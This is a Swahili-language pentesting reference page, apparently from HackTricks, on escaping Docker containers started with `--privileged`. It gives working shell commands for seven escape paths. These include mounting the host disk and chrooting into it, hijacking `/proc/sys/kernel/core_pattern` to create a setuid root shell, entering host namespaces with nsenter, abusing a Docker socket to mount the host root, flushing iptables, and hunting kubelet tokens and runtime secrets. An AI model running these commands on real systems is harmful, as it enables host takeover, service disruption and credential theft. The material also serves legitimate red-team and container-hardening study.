# Kutoka kwenye Kontena za `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Kontena iliyoanzishwa kwa `--privileged` si sawa na kontena ya kawaida yenye ruhusa moja au mbili za ziada. Kwa vitendo, `--privileged` huondoa au kudhoofisha ulinzi kadhaa wa kawaida wa runtime ambao kwa kawaida huweka workload mbali na rasilimali hatari za host. Athari halisi bado hutegemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:

- capabilities zote hutolewa
- vizuizi vya device cgroup huondolewa
- filesystems nyingi za kernel hazipachikwi tena kama read-only
- njia za procfs zinazofichwa kwa chaguo-msingi huondolewa
- seccomp filtering huzimwa
- confinement ya AppArmor huzimwa
- isolation ya SELinux huzimwa au hubadilishwa na label yenye wigo mpana zaidi

Jambo muhimu ni kwamba kontena yenye `--privileged` kwa kawaida **haihitaji** kernel exploit changamano. Mara nyingi inaweza kuingiliana moja kwa moja na devices za host, filesystems za kernel zinazoelekea kwa host, au runtime interfaces, kisha kuingia kwenye shell ya host.

## Kile `--privileged` Haibadilishi Kiotomatiki

`--privileged` **haiunganishi kiotomatiki** namespaces za PID, network, IPC, au UTS za host. Kontena yenye privileged bado inaweza kuwa na namespaces zake binafsi. Hii inamaanisha kwamba baadhi ya escape chains zinahitaji sharti la ziada kama vile:

- bind mount ya host
- kushiriki PID ya host
- network ya host
- devices za host zinazoonekana
- interfaces za proc/sys zenye uwezo wa kuandikwa

Masharti hayo mara nyingi ni rahisi kutokea katika misconfigurations halisi, lakini kimawazo ni tofauti na `--privileged` yenyewe.

## Njia za Escape

### 1. Pachika Disk ya Host Kupitia Devices Zilizo wazi

Kontena yenye privileged kwa kawaida huona device nodes nyingi zaidi chini ya `/dev`. Ikiwa block device ya host inaonekana, escape rahisi zaidi ni kuipachika na kutumia `chroot` kuingia kwenye filesystem ya host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ikiwa root partition haionekani wazi, kwanza orodhesha mpangilio wa block:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Iwapo njia ya kiutendaji ni kuweka setuid helper katika host mount inayoweza kuandikwa badala ya kutumia `chroot`, kumbuka kwamba si kila filesystem hutii setuid bit. Ukaguzi wa haraka wa capability upande wa host ni:
```bash
mount | grep -v "nosuid"
```
Hii ni muhimu kwa sababu paths zinazoweza kuandikwa zilizo chini ya filesystems za `nosuid` hazivutii sana kwa workflows za kawaida za "weka shell ya setuid na uiendeshe baadaye".

Protections zilizodhoofishwa zinazotumiwa vibaya hapa ni:

- kufichuliwa kikamilifu kwa vifaa
- capabilities pana, hasa `CAP_SYS_ADMIN`

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Au Tumia Tena Host Bind Mount Na `chroot`

Ikiwa host root filesystem tayari ime-mount ndani ya container, au ikiwa container inaweza kuunda mounts zinazohitajika kwa sababu ina privileged access, mara nyingi kupata host shell kunahitaji `chroot` moja tu:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa hakuna host root bind mount iliyopo lakini host storage inaweza kufikiwa, unda moja:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Njia hii hutumia vibaya:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Tumia Vibaya `/proc/sys` Au `/sys` Zinazoweza Kuandikwa

Mojawapo ya madhara makubwa ya `--privileged` ni kwamba protections za procfs na sysfs huwa dhaifu zaidi. Hilo linaweza kufichua kernel interfaces zinazoelekea kwenye host ambazo kwa kawaida hufichwa au hu-mountiwa kwa read-only.

Mfano wa kawaida ni `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Njia nyingine zenye thamani kubwa ni pamoja na:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Njia hii hutumia vibaya:

- paths zilizofichwa ambazo hazipo
- system paths za kusoma pekee ambazo hazipo

Kurasa zinazohusiana:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Tumia Full Capabilities Kwa Escape Inayotegemea Mount Au Namespace

Container yenye privileges hupata capabilities ambazo kwa kawaida huondolewa kwenye containers za kawaida, zikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingine nyingi. Mara nyingi hii inatosha kubadilisha foothold ya ndani kuwa escape kutoka kwa host pindi tu kunapokuwa na surface nyingine iliyo wazi.

Mfano rahisi ni ku-mount filesystems za ziada na kutumia namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ikiwa host PID pia inashirikiwa, hatua hiyo huwa fupi zaidi:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Njia hii hutumia vibaya:

- seti chaguomsingi ya capabilities za privileged
- kushiriki kwa hiari PID za host

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Kupitia Runtime Sockets

Container yenye privileges mara nyingi huishia kuwa na hali ya runtime ya host au sockets zinazoonekana. Ikiwa socket ya Docker, containerd, au CRI-O inaweza kufikiwa, mbinu rahisi mara nyingi ni kutumia runtime API kuanzisha container ya pili yenye ufikiaji wa host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kwa containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Njia hii hutumia vibaya:

- privileged runtime exposure
- host bind mounts zilizoundwa kupitia runtime yenyewe

Kurasa zinazohusiana:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ondoa Madhara ya Network Isolation

`--privileged` yenyewe haiunganishi container kwenye host network namespace, lakini ikiwa container pia ina `--network=host` au ufikiaji mwingine wa host network, network stack nzima inaweza kubadilishwa:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hii si mara zote huwa host shell ya moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au ufikiaji wa management services zinazopatikana kwenye loopback pekee.

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Kusoma Host Secrets Na Runtime State

Hata wakati clean shell escape haipatikani mara moja, privileged containers mara nyingi huwa na ufikiaji wa kutosha kusoma host secrets, hali ya kubelet, runtime metadata, na container filesystems za jirani:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ikiwa `/var` ime-mountiwa kutoka kwa host au directories za runtime zinaonekana, hii inaweza kutosha kwa lateral movement au wizi wa cloud/Kubernetes credentials hata kabla ya kupata host shell.

Kurasa zinazohusiana:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Ukaguzi

Madhumuni ya commands zifuatazo ni kuthibitisha ni familia zipi za privileged-container escape zinaweza kutumika mara moja.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Nini kinachovutia hapa:

- seti kamili ya capabilities, hasa `CAP_SYS_ADMIN`
- ufichuaji wa `proc/sys` unaoweza kuandikwa
- vifaa vya host vinavyoonekana
- kutokuwepo kwa seccomp na MAC confinement
- runtime sockets au host root bind mounts

Kimoja tu kati ya hivyo kinaweza kutosha kwa post-exploitation. Vingi kwa pamoja kwa kawaida humaanisha kuwa container iko umbali wa command moja au mbili tu kutoka kwa compromise ya host.

## Kurasa Zinazohusiana

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
